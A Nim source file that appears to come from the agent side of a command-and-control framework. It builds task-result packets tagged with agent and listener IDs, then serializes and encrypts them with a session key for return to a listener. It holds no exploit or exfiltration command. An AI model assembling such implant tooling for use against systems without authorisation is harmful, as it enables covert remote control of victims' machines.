import times, sugar
import ../../common/[types, serialize, crypto, utils]

proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, resultData: seq[byte]): TaskResult = 

    # TODO: Implement sequence tracking

    return TaskResult(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_RESPONSE),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: task.header.agentId,
            seqNr: 1'u64, 
            iv: generateIV(),
            gmac: default(array[16, byte])
        ), 
        taskId: task.taskId,
        listenerId: task.listenerId,
        timestamp: uint32(now().toTime().toUnix()),
        command: task.command,
        status: cast[uint8](status),
        resultType: cast[uint8](resultType),
        length: uint32(resultData.len),
        data: resultData,
    )

proc serializeTaskResult*(config: AgentConfig, taskResult: var TaskResult): seq[byte] = 
    
    var packer = initPacker()

    # Serialize result body
    packer 
        .add(taskResult.taskId)
        .add(taskResult.listenerId)
        .add(taskResult.timestamp)
        .add(taskResult.command)
        .add(taskResult.status)
        .add(taskResult.resultType)
        .add(taskResult.length)

    if cast[ResultType](taskResult.resultType) != RESULT_NO_OUTPUT:
        packer.addData(taskResult.data)

    let body = packer.pack()
    packer.reset()

    # Encrypt result body 
    let (encData, gmac) = encrypt(config.sessionKey, taskResult.header.iv, body, taskResult.header.seqNr)

    # Set authentication tag (GMAC)
    taskResult.header.gmac = gmac

    # Serialize header 
    let header = packer.packHeader(taskResult.header, uint32(encData.len))

    return header & encData 